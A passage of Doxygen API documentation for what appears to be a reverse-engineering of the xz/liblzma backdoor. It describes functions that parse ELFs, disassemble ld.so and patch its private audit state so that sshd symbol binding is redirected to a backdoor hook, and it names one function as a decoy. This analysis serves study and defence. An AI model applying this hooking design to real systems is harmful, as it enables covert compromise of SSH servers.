<dl class="section return"><dt>Returns</dt><dd>BOOL TRUE if parsing completed successfully, FALSE otherwise </dd></dl>

</div>
</div>
<a id="a9d2747f12c29ef6eae1cc4b09f3cc5f7"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a9d2747f12c29ef6eae1cc4b09f3cc5f7">&#9670;&nbsp;</a></span>elf_symbol_get()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">Elf64_Sym* elf_symbol_get </td>
          <td>(</td>
          <td class="paramtype"><a class="el" href="structelf__info.html">elf_info_t</a> *&#160;</td>
          <td class="paramname"><em>elf_info</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">EncodedStringId&#160;</td>
          <td class="paramname"><em>encoded_string_id</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">EncodedStringId&#160;</td>
          <td class="paramname"><em>sym_version</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Looks up an ELF symbol from a parsed ELF. </p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname"><a class="el" href="structelf__info.html">elf_info</a></td><td>the parsed ELF context </td></tr>
    <tr><td class="paramname">encoded_string_id</td><td>string ID of the symbol name </td></tr>
    <tr><td class="paramname">sym_version</td><td>optional string representing the symbol version (e.g. "GLIBC_2.2.5") </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>Elf64_Sym* pointer to the ELF symbol, or NULL if not found </dd></dl>

</div>
</div>
<a id="a099c6531c0b9aaf2a3caf6b001fa5109"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a099c6531c0b9aaf2a3caf6b001fa5109">&#9670;&nbsp;</a></span>elf_symbol_get_addr()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">void* elf_symbol_get_addr </td>
          <td>(</td>
          <td class="paramtype"><a class="el" href="structelf__info.html">elf_info_t</a> *&#160;</td>
          <td class="paramname"><em>elf_info</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">EncodedStringId&#160;</td>
          <td class="paramname"><em>encoded_string_id</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Looks up an ELF symbol from a parsed ELF, and returns its memory address. </p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname"><a class="el" href="structelf__info.html">elf_info</a></td><td>the parsed ELF context </td></tr>
    <tr><td class="paramname">encoded_string_id</td><td>string ID of the symbol name </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>void* the address of the symbol </dd></dl>

</div>
</div>
<a id="aeb6b7e7363a9d706fdd3704ef5faf584"></a>
<h2 class="memtitle"><span class="permalink"><a href="#aeb6b7e7363a9d706fdd3704ef5faf584">&#9670;&nbsp;</a></span>fake_lzma_alloc()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">void* fake_lzma_alloc </td>
          <td>(</td>
          <td class="paramtype">void *&#160;</td>
          <td class="paramname"><em>opaque</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">size_t&#160;</td>
          <td class="paramname"><em>nmemb</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">size_t&#160;</td>
          <td class="paramname"><em>size</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>a fake alloc function called by lzma_alloc() that then calls <a class="el" href="xzre_8h.html#a099c6531c0b9aaf2a3caf6b001fa5109" title="Looks up an ELF symbol from a parsed ELF, and returns its memory address.">elf_symbol_get_addr()</a> </p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">opaque</td><td>the parsed ELF context (elf_info_t*) </td></tr>
    <tr><td class="paramname">nmemb</td><td>not used </td></tr>
    <tr><td class="paramname">size</td><td>string ID of the symbol name (EncodedStringId) </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>void* the address of the symbol </dd></dl>

</div>
</div>
<a id="a5565761b59b3ef6786b83a9b50f72b17"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a5565761b59b3ef6786b83a9b50f72b17">&#9670;&nbsp;</a></span>fake_lzma_free()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">void fake_lzma_free </td>
          <td>(</td>
          <td class="paramtype">void *&#160;</td>
          <td class="paramname"><em>opaque</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">void *&#160;</td>
          <td class="paramname"><em>ptr</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>a fake free function called by lzma_free() </p>
<p>this function is a red herring as it is does nothing except make it look like lzma_alloc() is the real deal</p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">opaque</td><td>not used </td></tr>
    <tr><td class="paramname">ptr</td><td>not used </td></tr>
  </table>
  </dd>
</dl>

</div>
</div>
<a id="a41fada894916f4c67d59090ff57aead1"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a41fada894916f4c67d59090ff57aead1">&#9670;&nbsp;</a></span>find_call_instruction()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">BOOL find_call_instruction </td>
          <td>(</td>
          <td class="paramtype">u8 *&#160;</td>
          <td class="paramname"><em>code_start</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">u8 *&#160;</td>
          <td class="paramname"><em>code_end</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">u8 *&#160;</td>
          <td class="paramname"><em>call_target</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype"><a class="el" href="structdasm__ctx.html">dasm_ctx_t</a> *&#160;</td>
          <td class="paramname"><em>dctx</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>finds a call instruction </p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">code_start</td><td>address to start searching from </td></tr>
    <tr><td class="paramname">code_end</td><td>address to stop searching at </td></tr>
    <tr><td class="paramname">call_target</td><td>optional call target address. pass 0 to find any call </td></tr>
    <tr><td class="paramname">dctx</td><td>empty disassembler context to hold the state </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>BOOL TRUE if found, FALSE otherwise </dd></dl>

</div>
</div>
<a id="a8847a8cb7f015796a8fbd59cb7a18248"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a8847a8cb7f015796a8fbd59cb7a18248">&#9670;&nbsp;</a></span>find_dl_audit_offsets()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">BOOL find_dl_audit_offsets </td>
          <td>(</td>
          <td class="paramtype"><a class="el" href="xzre_8h.html#a98d97fcc51fcd4fdbc88e9cd1f0d4405">backdoor_data_handle_t</a> *&#160;</td>
          <td class="paramname"><em>data</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">ptrdiff_t *&#160;</td>
          <td class="paramname"><em>libname_offset</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype"><a class="el" href="structbackdoor__hooks__data.html">backdoor_hooks_data_t</a> *&#160;</td>
          <td class="paramname"><em>hooks</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype"><a class="el" href="structimported__funcs.html">imported_funcs_t</a> *&#160;</td>
          <td class="paramname"><em>imported_funcs</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Find the various offsets in ld.so that need modification to trigger _dl_audit_symbind_alt() to call <a class="el" href="xzre_8h.html#a60ba9b591b9f0b10a78ea2136a0a3adc" title="the backdoored symbind64 installed in GLRO(dl_audit)">backdoor_symbind64()</a>. </p>
<p>First, this function finds the location and size of ld.so's _dl_audit_symbind_alt().</p>
<p>This function then calls <a class="el" href="xzre_8h.html#a17824cde912b4de5dd68530dcbf9d42c" title="Find struct link_map offsets required to modify ld.so&#39;s private struct auditstate state.">find_link_map_l_name()</a>, <a class="el" href="xzre_8h.html#a18543737f1eaf3cb1288d0c57c1f0a65" title="Find __rtld_global_ro offsets required to modify ld.so&#39;s private struct audit_ifaces state.">find_dl_naudit()</a> and <a class="el" href="xzre_8h.html#a2d980185c135b2dd9bc69c099ba60c25" title="Find struct link_map offset required to modify ld.so&#39;s private link_map::l_audit_any_plt state.">find_link_map_l_audit_any_plt()</a> to get the various offsets required to modify ld.so's private audit state so that _dl_audit_symbind_alt() will call <a class="el" href="xzre_8h.html#a60ba9b591b9f0b10a78ea2136a0a3adc" title="the backdoored symbind64 installed in GLRO(dl_audit)">backdoor_symbind64()</a>.</p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">data</td><td></td></tr>
    <tr><td class="paramname">libname_offset</td><td>output of the offset from the start of the link_map to the location directly after where the link_map::l_name string data is stored </td></tr>
    <tr><td class="paramname">hooks</td><td></td></tr>
    <tr><td class="paramname"><a class="el" href="structimported__funcs.html">imported_funcs</a></td><td></td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>BOOL TRUE if successful, FALSE otherwise </dd></dl>

</div>
</div>
<a id="a18543737f1eaf3cb1288d0c57c1f0a65"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a18543737f1eaf3cb1288d0c57c1f0a65">&#9670;&nbsp;</a></span>find_dl_naudit()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">BOOL find_dl_naudit </td>
          <td>(</td>
          <td class="paramtype"><a class="el" href="structelf__info.html">elf_info_t</a> *&#160;</td>
          <td class="paramname"><em>dynamic_linker_elf</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype"><a class="el" href="structelf__info.html">elf_info_t</a> *&#160;</td>
          <td class="paramname"><em>libcrypto_elf</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype"><a class="el" href="structbackdoor__hooks__data.html">backdoor_hooks_data_t</a> *&#160;</td>
          <td class="paramname"><em>hooks</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype"><a class="el" href="structimported__funcs.html">imported_funcs_t</a> *&#160;</td>
          <td class="paramname"><em>imported_funcs</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Find __rtld_global_ro offsets required to modify ld.so's private struct audit_ifaces state. </p>
<p>First, this function disassembles ld.so to search for the assert(GLRO(dl_naudit) &lt;= naudit) from _dl_main(). This assert has a LEA instruction with an offset to ld.so's __rtld_global_ro::_dl_naudit.</p>
<p>This function disassembles ld.so's _dl_audit_symbind_alt() to verify it contains a LEA instruction with an offset that matches __rtld_global_ro::_dl_naudit.</p>
<p>This function then sets ldso_ctx::dl_naudit_offset and ldso_ctx::dl_naudit_offset to the offset from the start of __rtld_global_ro to __rtld_global_ro::_dl_naudit and __rtld_global_ro::_dl_audit respectively.</p>
<p>This function also resolves a number of libcrypto function addresses.</p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">dynamic_linker_elf</td><td>elf_info_t for ld.so </td></tr>
    <tr><td class="paramname">libcrypto_elf</td><td>elf_info_t for libcrypto </td></tr>
    <tr><td class="paramname">hooks</td><td></td></tr>
    <tr><td class="paramname"><a class="el" href="structimported__funcs.html">imported_funcs</a></td><td></td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>BOOL TRUE if successful, FALSE otherwise </dd></dl>

</div>
</div>
<a id="adb94193174339f9eae22428308d46c33"></a>
<h2 class="memtitle"><span class="permalink"><a href="#adb94193174339f9eae22428308d46c33">&#9670;&nbsp;</a></span>find_function()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">BOOL find_function </td>
          <td>(</td>
          <td class="paramtype">u8 *&#160;</td>
          <td class="paramname"><em>code_start</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">void **&#160;</td>
          <td class="paramname"><em>func_start</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">void **&#160;</td>
          <td class="paramname"><em>func_end</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">u8 *&#160;</td>
          <td class="paramname"><em>search_base</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">u8 *&#160;</td>
          <td class="paramname"><em>code_end</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">FuncFindType&#160;</td>
          <td class="paramname"><em>find_mode</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>locates the function boundaries. </p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">code_start</td><td>address to start searching from </td></tr>
    <tr><td class="paramname">func_start</td><td>if provided, will be filled with the function's start address </td></tr>
    <tr><td class="paramname">func_end</td><td>if provided, will be filled with the function's end address </td></tr>
    <tr><td class="paramname">search_base</td><td>lowest search address, where search will be aborted </td></tr>
    <tr><td class="paramname">code_end</td><td>address to stop searching at </td></tr>
    <tr><td class="paramname">find_mode</td><td></td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>BOOL </dd></dl>

</div>
</div>
<a id="a81a6f3d01ea6057c942052321b92c533"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a81a6f3d01ea6057c942052321b92c533">&#9670;&nbsp;</a></span>find_function_prologue()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">BOOL find_function_prologue </td>
          <td>(</td>
          <td class="paramtype">u8 *&#160;</td>
          <td class="paramname"><em>code_start</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">u8 *&#160;</td>
          <td class="paramname"><em>code_end</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">u8 **&#160;</td>
          <td class="paramname"><em>output</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">FuncFindType&#160;</td>
          <td class="paramname"><em>find_mode</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>locates the function prologue </p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">code_start</td><td>address to start searching from </td></tr>
    <tr><td class="paramname">code_end</td><td>address to stop searching at </td></tr>
    <tr><td class="paramname">output</td><td>pointer to receive the resulting prologue address, if found </td></tr>
    <tr><td class="paramname">find_mode</td><td>prologue search mode/strategy </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>BOOL TRUE if found, FALSE otherwise </dd></dl>

</div>
</div>
<a id="a60c226501adb1a2d3213484f651ff23b"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a60c226501adb1a2d3213484f651ff23b">&#9670;&nbsp;</a></span>find_instruction_with_mem_operand()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">BOOL find_instruction_with_mem_operand </td>
          <td>(</td>
          <td class="paramtype">u8 *&#160;</td>
          <td class="paramname"><em>code_start</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">u8 *&#160;</td>
          <td class="paramname"><em>code_end</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype"><a class="el" href="structdasm__ctx.html">dasm_ctx_t</a> *&#160;</td>
          <td class="paramname"><em>dctx</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">void *&#160;</td>
          <td class="paramname"><em>mem_address</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>finds a LEA or MOV instruction with an immediate memory operand </p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">code_start</td><td>address to start searching from </td></tr>
    <tr><td class="paramname">code_end</td><td>address to stop searching at </td></tr>
    <tr><td class="paramname">dctx</td><td>disassembler context to hold the state </td></tr>
    <tr><td class="paramname">mem_address</td><td>the address of the memory fetch (where the instruction will fetch from) </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>BOOL TRUE if an instruction was found, FALSE otherwise </dd></dl>

</div>
</div>
<a id="a1c8a36d89bf4e57077a56611e9aeb470"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a1c8a36d89bf4e57077a56611e9aeb470">&#9670;&nbsp;</a></span>find_instruction_with_mem_operand_ex()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">BOOL find_instruction_with_mem_operand_ex </td>
          <td>(</td>
          <td class="paramtype">u8 *&#160;</td>
          <td class="paramname"><em>code_start</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">u8 *&#160;</td>
          <td class="paramname"><em>code_end</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype"><a class="el" href="structdasm__ctx.html">dasm_ctx_t</a> *&#160;</td>
          <td class="paramname"><em>dctx</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">int&#160;</td>
          <td class="paramname"><em>opcode</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">void *&#160;</td>
          <td class="paramname"><em>mem_address</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>finds an instruction with an immediate memory operand </p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">code_start</td><td>address to start searching from </td></tr>
    <tr><td class="paramname">code_end</td><td>address to stop searching at </td></tr>
    <tr><td class="paramname">dctx</td><td>disassembler context to hold the state </td></tr>
    <tr><td class="paramname">opcode</td><td>opcode to look for, in encoded form (+0x80) </td></tr>
    <tr><td class="paramname">mem_address</td><td>the expected address of the memory access </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>BOOL TRUE if found, FALSE otherwise </dd></dl>

</div>
</div>
<a id="aea85a14166f11bb956c7862c2a66571e"></a>
<h2 class="memtitle"><span class="permalink"><a href="#aea85a14166f11bb956c7862c2a66571e">&#9670;&nbsp;</a></span>find_lea_instruction()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">BOOL find_lea_instruction </td>
          <td>(</td>
          <td class="paramtype">u8 *&#160;</td>
          <td class="paramname"><em>code_start</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">u8 *&#160;</td>
          <td class="paramname"><em>code_end</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">u64&#160;</td>
          <td class="paramname"><em>displacement</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>finds a lea instruction </p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">code_start</td><td>address to start searching from </td></tr>
    <tr><td class="paramname">code_end</td><td>address to stop searching at </td></tr>
    <tr><td class="paramname">displacement</td><td>the memory displacement operand of the target lea instruction </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>BOOL TRUE if found, FALSE otherwise </dd></dl>

</div>
</div>
<a id="a6e76946a37fb256974942a542373e421"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a6e76946a37fb256974942a542373e421">&#9670;&nbsp;</a></span>find_lea_instruction_with_mem_operand()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">BOOL find_lea_instruction_with_mem_operand </td>
          <td>(</td>
          <td class="paramtype">u8 *&#160;</td>
          <td class="paramname"><em>code_start</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">u8 *&#160;</td>
          <td class="paramname"><em>code_end</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype"><a class="el" href="structdasm__ctx.html">dasm_ctx_t</a> *&#160;</td>
          <td class="paramname"><em>dctx</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">void *&#160;</td>
          <td class="paramname"><em>mem_address</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>finds a LEA instruction with an immediate memory operand </p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">code_start</td><td>address to start searching from </td></tr>
    <tr><td class="paramname">code_end</td><td>address to stop searching at </td></tr>
    <tr><td class="paramname">dctx</td><td>disassembler context to hold the state </td></tr>
    <tr><td class="paramname">mem_address</td><td>the expected address of the memory access </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>BOOL TRUE if found, FALSE otherwise </dd></dl>

</div>
</div>
<a id="a2d980185c135b2dd9bc69c099ba60c25"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a2d980185c135b2dd9bc69c099ba60c25">&#9670;&nbsp;</a></span>find_link_map_l_audit_any_plt()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">BOOL find_link_map_l_audit_any_plt </td>
          <td>(</td>
          <td class="paramtype"><a class="el" href="xzre_8h.html#a98d97fcc51fcd4fdbc88e9cd1f0d4405">backdoor_data_handle_t</a> *&#160;</td>
          <td class="paramname"><em>data</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">ptrdiff_t&#160;</td>
          <td class="paramname"><em>libname_offset</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype"><a class="el" href="structbackdoor__hooks__data.html">backdoor_hooks_data_t</a> *&#160;</td>
          <td class="paramname"><em>hooks</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype"><a class="el" href="structimported__funcs.html">imported_funcs_t</a> *&#160;</td>
          <td class="paramname"><em>imported_funcs</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Find struct link_map offset required to modify ld.so's private link_map::l_audit_any_plt state. </p>
<p>First, this function disassembles ld.so's _dl_audit_symbind_alt() to search for a MOVZX instruction that fetches the link_map::l_audit_any_plt. The first MOVZ instruction that uses an offset within the range from the start of struct link_map to libname_offset.</p>
<p>This function then calls <a class="el" href="xzre_8h.html#a82817ae0ac4e7e9a7ded04c0fa16ed9c" title="Find the bitmask required to modify ld.so&#39;s private link_map::l_audit_any_plt state.">find_link_map_l_audit_any_plt_bitmask()</a> to get the bitmask required to modify link_map::l_audit_any_plt.</p>
<p>This function also resolves a libc function address.</p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">data</td><td></td></tr>
    <tr><td class="paramname">libname_offset</td><td>the offset from the start of the link_map to the location directly after where the link_map::l_name string data is stored </td></tr>
    <tr><td class="paramname">hooks</td><td></td></tr>
    <tr><td class="paramname"><a class="el" href="structimported__funcs.html">imported_funcs</a></td><td></td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>BOOL TRUE if successful, FALSE otherwise </dd></dl>

</div>
</div>
<a id="a82817ae0ac4e7e9a7ded04c0fa16ed9c"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a82817ae0ac4e7e9a7ded04c0fa16ed9c">&#9670;&nbsp;</a></span>find_link_map_l_audit_any_plt_bitmask()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">BOOL find_link_map_l_audit_any_plt_bitmask </td>
          <td>(</td>
          <td class="paramtype"><a class="el" href="xzre_8h.html#a98d97fcc51fcd4fdbc88e9cd1f0d4405">backdoor_data_handle_t</a> *&#160;</td>
          <td class="paramname"><em>data</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype"><a class="el" href="structinstruction__search__ctx.html">instruction_search_ctx_t</a> *&#160;</td>
          <td class="paramname"><em>search_ctx</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Find the bitmask required to modify ld.so's private link_map::l_audit_any_plt state. </p>
<p>First, this function disassembles ld.so's _dl_audit_symbind_alt() to search for a sequence of MOVZ, OR, and TEST instructions that fetch the link_map::l_audit_any_plt.</p>
<p>This function then sets ldso_ctx::sshd_link_map_l_audit_any_plt_addr to the offset to the address of sshd's link_map::l_audit_any_plt flag;</p>
<p>This function also sets ldso_ctx::l_audit_any_plt_bitmask to the bitmask that sets the link_map::l_audit_any_plt flag.</p>
<p>This function also resolves a number of libc and libcrypto function addresses.</p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">data</td><td></td></tr>
    <tr><td class="paramname">search_ctx</td><td>the instruction addresses to search as well as the offset and output registers of the instructions to match </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>BOOL TRUE if successful, FALSE otherwise </dd></dl>

</div>
</div>
<a id="a17824cde912b4de5dd68530dcbf9d42c"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a17824cde912b4de5dd68530dcbf9d42c">&#9670;&nbsp;</a></span>find_link_map_l_name()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">BOOL find_link_map_l_name </td>
          <td>(</td>
          <td class="paramtype"><a class="el" href="xzre_8h.html#a98d97fcc51fcd4fdbc88e9cd1f0d4405">backdoor_data_handle_t</a> *&#160;</td>
          <td class="paramname"><em>data_handle</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">ptrdiff_t *&#160;</td>
          <td class="paramname"><em>libname_offset</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype"><a class="el" href="structbackdoor__hooks__data.html">backdoor_hooks_data_t</a> *&#160;</td>
          <td class="paramname"><em>hooks</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype"><a class="el" href="structimported__funcs.html">imported_funcs_t</a> *&#160;</td>
          <td class="paramname"><em>imported_funcs</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Find struct link_map offsets required to modify ld.so's private struct auditstate state. </p>
<p>This function inspects ld.so's private struct link_map for liblzma.</p>
<p>First, this function finds the end of the link_map by searching for the private link_map::l_relro_addr and link_map::l_relro_size with values that match liblzma's <a class="el" href="structelf__info.html#a8500b4de03a9b9d44989375921b27f70" title="location of the GNU relro segment">elf_info_t::gnurelro_vaddr</a> and <a class="el" href="structelf__info.html#a1783b21f972415e71d5cb7d8531de5e5" title="size of the GNU relro segment">elf_info_t::gnurelro_memsize</a> respectively.</p>
<p>This function then calculates libname_offset by searching for linkmap::l_name which points to a string stored just after the link_map by ld.so's _dl_new_object().</p>
<p>This function then sets ldso_ctx::libcrypto_l_name to the location of link_map::l_name for the libcrypto link_map.</p>
<p>This function disassembles ld.so's _dl_audit_preinit() and _dl_audit_symbind_alt() to verify both contain a LEA instruction with an offset that matches libname_offset.</p>
<p>This function also resolves a number of libc and libcrypto function addresses.</p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">data_handle</td><td></td></tr>
    <tr><td class="paramname">libname_offset</td><td>output of the offset from the start of the link_map to the location directly after where the link_map::l_name string data is stored </td></tr>
    <tr><td class="paramname">hooks</td><td></td></tr>
    <tr><td class="paramname"><a class="el" href="structimported__funcs.html">imported_funcs</a></td><td></td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>BOOL TRUE if successful, FALSE otherwise </dd></dl>

</div>
</div>
<a id="a3ab8cd040932beaf3ec377a753bfece0"></a>
